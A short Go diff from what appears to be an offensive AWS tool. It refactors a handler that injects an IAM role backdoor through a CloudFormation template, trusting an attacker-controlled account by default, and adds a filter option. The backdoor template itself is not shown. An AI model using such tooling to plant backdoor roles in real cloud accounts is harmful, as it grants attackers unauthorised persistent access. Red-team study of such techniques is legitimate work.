@@ -7,6 +7,7 @@ type CreateIAMRoleBackdoorOptions struct {
 	LogicalID   string
 	RoleName    string
 	S3AccessKey *S3AccessKey
+	*Filter
 }
 
 func (c *CFNI) CreateIAMRoleBackdoorHandler(opts *CreateIAMRoleBackdoorOptions) ([]byte, error) {
@@ -14,19 +15,18 @@ func (c *CFNI) CreateIAMRoleBackdoorHandler(opts *CreateIAMRoleBackdoorOptions) 
 		opts.Principal = fmt.Sprintf("arn:aws:iam::%s:root", c.attackerAccount)
 	}
 
-	type data struct {
-		Principal string
-		LogicalID string
-		RoleName  string
-	}
-
 	return c.createHandler(&HandlerOptions{
 		CFNITemplate: "templates/iam_role_backdoor.py",
-		CFNIData: &data{
+		CFNIData: &struct {
+			Principal string
+			LogicalID string
+			RoleName  string
+		}{
 			Principal: opts.Principal,
 			LogicalID: opts.LogicalID,
 			RoleName:  opts.RoleName,
 		},
 		S3Client: s3Client(opts.S3AccessKey),
+		Filter:   opts.Filter,
 	})
 }
